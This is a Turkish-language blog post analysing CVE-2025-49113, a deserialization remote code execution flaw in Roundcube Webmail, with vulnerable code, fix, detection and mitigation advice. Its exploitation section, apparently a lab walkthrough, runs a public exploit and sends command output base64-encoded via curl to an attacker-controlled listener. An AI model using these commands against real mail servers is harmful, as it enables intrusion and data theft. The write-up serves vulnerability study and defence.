---
title: "CVE: Roundcube: CVE-2025-49113"
author: b1lal
categories: [CVE, "2025"]
tags: [cve, cve 2025-49113, privilege escalation, symlink, PoC, linux, sudo, zero-day, exploit, roundcube, outbound]
render_with_liquid: false
description: "CVE-2025-49113, Roundcube Webmail’in 1.5.0 ile 1.6.10 arasındaki sürümlerinde bulunan deserialization güvenlik açığını hedef almaktadır. Açık, kimliği doğrulanmış bir saldırganın sunucuda rastgele kod çalıştırmasına olanak tanır."
media_subpath: /images/roundcube_cve_2025_49113/
layout: post
published: true  
lang: "tr"
image:
  path: main.png
  alt: "Roundcube: CVE-2025-49113"
---


Bu yazımda, kısa bir süre önce yayınlanan `Roundcube` adlı web tabanlı e-posta istemcisinde bulunan ve kullanıcıların RCE elde etmesine yol açan güvenlik açığı olan **CVE-2025-49113**'ü inceleyeceğiz.



<br>

## **Nasıl Çalışıyor?**

****

**CVE-2025-49113**, Roundcube Webmail’in 1.5.x sürümlerinde 1.5.0–1.5.9 arası ve 1.6.x sürümlerinde 1.6.0–1.6.10 arası (bu sürümler 1.5.10 ve 1.6.11 öncesini kapsar) bulunan kritik bir güvenlik açığıdır. Açığın kaynağı, `program/actions/settings/upload.php` içindeki `_from` URL parametresinin yeterince doğrulanmamasıdır. Bu, kimliği doğrulanmış bir saldırganın PHP Object Deserialization yoluyla uzaktan komut çalıştırmasına - RCE olanak tanır. Bu zafiyet, <a href="https://x.com/k_firsov" target="_blank" rel="noopener noreferrer">Kirill Firsov</a> tarafından Roundcube Webmail üzerinde keşfedilmiştir.



<div style="text-align: center;">
  <img src="score.png" alt="Score" width="400"/>
  <figcaption><em>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</em></figcaption>
</div>


<br>

### **Etkilenen Versiyonlar**

****

**Bu Versiyonlar Zafiyetten Etkilenmektedir:**

- Roundcube 1.5.0 – 1.5.9

- Roundcube 1.6.0 – 1.6.10

**Bu Versiyonlar Zafiyetten Etkilenmemektedir (Güvenli olanlar):**

- Roundcube 1.5.10 ve sonrası

- Roundcube 1.6.11 ve sonrası

<br>

Projenin orijinal reposu : <a href="https://github.com/roundcube/roundcubemail" target="_blank" rel="noopener noreferrer">https://github.com/roundcube/roundcubemail</a>



<br>

### **Zafiyetin Etkisi**

****

- Zafiyetin en büyük etkisi kimliği doğrulanmış bir kullanıcının, özel bir şekilde hazırlanmış `_from` parametresiyle PHP nesne deserializasyonu üzerinden uzaktan kod çalıştırabilmesidir (RCE).

Sistem üzerinde uzaktan kod çalıştırabilmek ciddi tehlikelere yol açabilir. İçeriye arka kapılar bırakılabilir yada zamanlanmış görevler ile farklı şekillerde sistem üzerinde hasarlara yol açabilir.



<br>

### **Detaylı Teknik Açıklama**

****

**Serialization**, PHP, Java veya Python gibi dillerde bir nesneyi saklanabilir veya iletilebilir bir formata dönüştürme sürecidir. Bu süreç, nesneleri dosyalarda veya veritabanlarında saklamak ve nesneleri ağ üzerinden (API gibi) göndermek için yaygın olarak kullanılır.

**Deserialization** ise bu sürecin tam tersidir; serileştirilmiş veriyi tekrar program nesnesine dönüştürme işlemidir. Deserialization zafiyeti, uygulamanın güvenilmeyen veya değiştirilmiş veriyi deserileştirmesi durumunda ortaya çıkan bir güvenlik açığıdır. Saldırgan, serileştirilmiş veriyi manipüle ederek yetkisiz kod çalıştırabilir veya ayrıcalık yükseltme gibi kötü niyetli eylemler gerçekleştirebilir.

<br>

#### **Güvenlik Açığının Kaynağı:**

Roundcube'ün `program/actions/settings/upload.php` dosyasının içerisindeki `_from` parametresi kullanıcı tarafından kontrol edilen bir parametre olup, **upload.php** dosyasında `$from` değişkenine atanır ve bu değişken üzerinden `$type` oluşturulur. 


```php
$from = rcube_utils::get_input_string('_from', rcube_utils::INPUT_GET);
$type = preg_replace('/(add|edit)-/', '', $from);

$type = str_replace('.', '-', $type);
```

`$type`, sonrasında dosyanın **session**'a eklenmesinde kullanılır:

```php
if (!$err && !empty($attachment['status']) && empty($attachment['abort'])) {
    $id = $attachment['id'];

    // store new file in session  
    unset($attachment['status'], $attachment['abort']);
    $rcmail -> session -> append($type. '.files', $id, $attachment);   //  <--- Session'a ekleniyor

    $content = rcube:: Q($attachment['name']);

    $rcmail -> output -> command('add2attachment_list', "rcmfile$id", [
        'html'      => $content,
        'name'      => $attachment['name'],
        'mimetype'  => $attachment['mimetype'],
        'classname' => rcube_utils:: file2class($attachment['mimetype'], $attachment['name']),
        'complete'  => true
    ],
        $uploadid
    );
}
```

Bu yapı, `$type` parametresinin kontrolsüz bir şekilde **session**'a eklenmesine neden olur. Saldırgan, `_from` parametresini manipüle ederek, session'da istenmeyen dosyaların saklanmasına yol açabilir. Bu durum, özellikle PHP'nin **unserialize()** fonksiyonunun kullanıldığı yerlerde, zararlı nesnelerin oluşturulmasına ve çalıştırılmasına olanak tanır.

Roundcube **unserialize()** fonksiyonu : 
<a href="https://github.com/roundcube/roundcubemail/blob/c75f1b7e8690a38004f08275ef327e64dc15a816/program/lib/Roundcube/rcube_session.php#L521" target="_blank" rel="noopener noreferrer">unserialize()</a>

<br>

#### **Sorunun Çözümü**

Bu zafiyetin çözümü için `_from` parametresinin güvenli olmayan parametreleri içerip içermediğini kontrol etmek gerekmektedir. Bunun için aşağıdaki kod parçası eklenmiştir.

![validate](validate.png)

Herhangi bir yazılım dilini bir derece biliyorsanız aşağıdaki kodun `_from` parametresinin güvenli olmayan parametreleri içerip içermediğini kontrol ettiğini anlayabiliriz.

<br>

<blockquote class="prompt-info"><p>Daha teknik detayları incelemek isterseniz Araştırmacı Kirill Firsov'un yazdığı makaleyi okuyabilirsiniz: <a href="https://fearsoff.org/research/roundcube" target="_blank" rel="noopener noreferrer">https://fearsoff.org/research/roundcube</a> </p>
</blockquote>
<br>

## **Nasıl Sömürülür?**

Zafiyetli bir makine üzerinden sömürü yöntemlerini adım adım açıklayarak gerçekleştireceğiz. Sömürü aşamasına geçmeden önce elimizde bu kullanıcı bilgileri bulunmaktadır. `tyler`:`LhKL1o9Nm3X2`

Bize verilen kullanıcı adı ve parola bilgisi ile sisteme giriş yaptıktan sonra **About** sayfasına tıklıyoruz ve hangi versiyonun kullanıldığını tespit ediyoruz.

![Version](version.png)

Bu versiyonun zafiyetli olduğunu bildiğimiz için şimdi sömürü aşamasına geçebiliriz. Zafiyeti sömürmek için bu repoyu kullanacağız : <a href="https://github.com/hakaioffsec/CVE-2025-49113-exploit" target="_blank" rel="noopener noreferrer">https://github.com/hakaioffsec/CVE-2025-49113-exploit</a> 

İlk olarak repoyu kendi sistemimize klonlayarak başlıyoruz:

```bash
git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit.git
```

Şimdi klasörün içerisine giriyoruz:

```bash
cd CVE-2025-49113-exploit
```

Bu PHP betiğini aşağıdaki şekilde kullanacağımızı öğreniyoruz.

```php
php CVE-2025-49113.php <url> <username> <password> <command>
```

Parametreleri tek tek vererek aşağıdaki gibi betiği çalıştırıyoruz.

```bash
php CVE-2025-49113.php http://mail.redacted.com tyler LhKL1o9Nm3X2 "whoami"
```

Sonuç:

```bash
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```

Verdiğimiz komutun başarılı bir şekilde çalıştığını görüyoruz ancak cevap bize yansımadığı için bunu curl komutu kullanarak bizim sistemimize yönlendirmemiz gerekiyor. Bunun için **ifconfig** komutu ile IP adresimizi öğreniyoruz. Daha sonra aşağıdaki şekilde bir python sunucusu açıyoruz.

```bash
python3 -m http.server 8081
```

Şimdi aşağıdaki komutu çalıştırıyoruz ve sunucumuza istek gelip gelmeyeceğine bakıyoruz.

```bash
php CVE-2025-49113.php http://mail.redacted.com tyler LhKL1o9Nm3X2 "curl http://10.10.14.147:8081/?test"
```

Aşağıdaki şekilde sunucumuza isteğin geldiğini görüyoruz.

```bash
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.77 - - [17/Aug/2025 20:48:04] "GET /?test HTTP/1.1" 200 -
```

Bundan sonraki kısmı otomatikleştirmek ve çalıştırdığımız komutlardan aldığımız sonuçlarda veri kaybı yaşamamak adına sonuçları **base64** koduna çevireceğiz ve aşağıdaki PHP scripti ile **data** parametresi ile gönderdiğimiz base64 kodunu decode ederek ekrana basacağız. 

```php
<?php
  if (isset($_GET['data'])) {
     $data = base64_decode($_GET['data']);

  error_log("\nDecoded data =>>> " . $data . "\n");
}
?>
```

Python ile açtığımız sunucuyu durdurup aşağıdaki komut ile PHP sunucumuzu başlatıyoruz.

```bash
php -S 0.0.0.0:8081
```

Zafiyetli sistem için yaptığımız isteği aşağıdaki şekilde güncelliyoruz.

```bash
php CVE-2025-49113.php http://mail.redacted.com tyler LhKL1o9Nm3X2 'curl http://10.10.14.147:8081/index.php?data=$(id | base64)'
```

PHP sunucumuzun loglarına baktığımızda aşağıdaki gibi bir çıktı görüyoruz.

```bash
[Sun Aug 17 21:14:47 2025] 10.10.11.77:55952 Accepted
[Sun Aug 17 21:14:47 2025]
Decoded data =>>> uid=33(www-data) gid=33(www-data) groups=33(www-data)


[Sun Aug 17 21:14:47 2025] 10.10.11.77:55952 [200]: GET /index.php?data=dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
[Sun Aug 17 21:14:47 2025] 10.10.11.77:55952 Closing
```

Bu şekilde yapacağımız işlemi biraz daha kolaylaştırmış oluyoruz.

Bundan sonrası hemen akla geleceği gibi sistem üzerinden reverse shell almaktır. Bunun için internet üzerinde bulunan shell kopya kağıtları kullanılabilir.

<br>

## **Tespit**

****

Bu zafiyetin istismar edilip edilmediği, özellikle `upload.php` dosyasına yapılan isteklerin log analiziyle anlaşılabilir. `_from` parametresinde beklenmeyen, şüpheli karakterler ve en önemlisi çok uzun değerler görüldüğünde, saldırı denemesi ihtimali yüksektir. Ayrıca, Roundcube’un **session** dosyalarında olağan dışı nesne yapıları ya da eklenmemesi gereken dosyaların bulunması, zafiyetin sömürüldüğüne işaret eder.

<br>

## **Önlem ve Güncelleme**

****

Roundcube geliştiricileri, güvenlik açığını kapatmak için `_from` parametresine sıkı doğrulama kontrolleri eklemiş ve yalnızca güvenli karakterlere izin verilmesini sağlamıştır. Böylece, saldırganın parametreyi manipüle ederek session içerisine zararlı veriler enjekte etmesinin önüne geçilmiştir.

Bu zafiyetten ve genel olarak serileştirme zafiyetlerinden etkilenmemek için aşağıdaki maddelere dikkat edilmelidir.

- Roundcube Webmail’in en güncel sürümü kullanılmalıdır.

- Uygulama içerisinde kullanıcıdan gelen her parametrenin doğrulanması gerektiği unutulmamalıdır.

- Özellikle PHP’de **unserialize()** gibi fonksiyonlar kullanılırken, güvenlik açısından mümkünse alternatif yöntemler (örneğin JSON tabanlı serileştirme) tercih edilmelidir.

- Sistem yöneticileri, Roundcube güvenlik duyurularını düzenli olarak takip etmeli ve kritik yamaları gecikmeden uygulamalıdır.

<br>

## Referanslar

- <a href="https://fearsoff.org/research/roundcube" target="_blank" rel="noopener noreferrer">https://fearsoff.org/research/roundcube</a>
- <a href="https://thehackernews.com/2025/06/critical-10-year-old-roundcube-webmail.html" target="_blank" rel="noopener noreferrer">https://thehackernews.com/2025/06/critical-10-year-old-roundcube-webmail.html</a>
- <a href="https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d" target="_blank" rel="noopener noreferrer">https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d</a>
- <a href="https://www.offsec.com/blog/cve-2025-49113/" target="_blank" rel="noopener noreferrer">https://www.offsec.com/blog/cve-2025-49113/</a>


<br>

<p style="font-weight:900; color: gray; font-size: 50px; text-align:center;">Okuduğunuz için teşekkür ederim.<p>

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

.post-desc {
  font-family: 'Open Sans', sans-serif !important;
}
</style>
